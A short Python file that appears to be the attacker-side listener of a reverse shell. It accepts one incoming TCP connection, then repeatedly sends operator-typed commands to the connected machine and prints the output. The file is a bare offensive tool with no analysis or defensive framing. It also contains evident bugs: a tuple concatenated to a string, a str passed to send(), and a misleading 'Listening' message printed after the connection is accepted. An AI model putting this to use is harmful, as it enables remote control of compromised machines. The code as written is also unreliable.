import socket

class SockketListener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip,int(port)))
        my_listener.listen(0)
        (self.my_connection,self.my_address) = my_listener.accept();
        print('[+] Listening on port ' +port)

    def start_listener(self):
        while True:
            print('[+] Accepted connection from '+self.my_address)
            command = input("\n enter the command: ")
            self.my_connection.send(command);
            print(self.my_connection.recv(1024))